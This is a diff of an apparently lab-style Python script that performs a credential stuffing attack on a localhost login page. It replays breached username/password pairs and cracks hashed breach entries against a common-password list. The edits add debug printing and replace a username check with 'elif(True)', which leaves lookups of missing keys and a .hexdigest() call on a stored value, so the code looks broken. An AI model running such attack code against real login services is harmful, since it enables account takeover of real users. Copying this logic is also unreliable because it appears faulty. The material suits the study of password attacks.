@@ -1,6 +1,10 @@
 from csv import reader
 from requests import post, codes
 import hashlib as hl
+from app.util.hash import *
+import pprint
+
+
 LOGIN_URL = "http://localhost:8080/login"
 
 PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
@@ -41,12 +45,14 @@ def create_common_pass_hash(common_pass):
     common_hash = {}
     h = hl.sha256()
     for password in common_pass:
-        common_hash[hl.sha256(password[0].encode()).hexdigest()] = password[0]
+        common_hash[hash_sha256(password[0])] = password[0]
+        #common_hash[hl.sha256(password[0].encode()).hexdigest()] = password[0]
     return common_hash
 
 def credential_stuffing_attack(creds):
-    pass_to_hash = {}
     hashed_breach = load_hashed_breach(HASHED_PASSWORDS_PATH)
+    pprint.pprint(hashed_breach)
+
     common_pass = load_common_passwords(COMMON_PASSWORD_HASH)
     comm_pass_hash = create_common_pass_hash(common_pass) 
     successful_creds = []
@@ -55,16 +61,13 @@ def credential_stuffing_attack(creds):
         password = user_pass[1]
         if attempt_login(username ,password):
             successful_creds.append(user_pass)
-        elif (username in hashed_breach):
-            print('1')
+        #usernames not in hashed_breach
+        elif(True):
+            print(username)
+            #username in hashed_breach):
             if( hashed_breach[username] in common_pass):
-                print('2')
                 if(attempt_login(username , comm_pass_hash[hashed_breach[username].hexdigest()])):
-                    print('3')
                     successful_creds.append(user_pass)
-    print(hashed_breach)
-    print()
-    print(successful_creds)
     return successful_creds 
 
 def main():
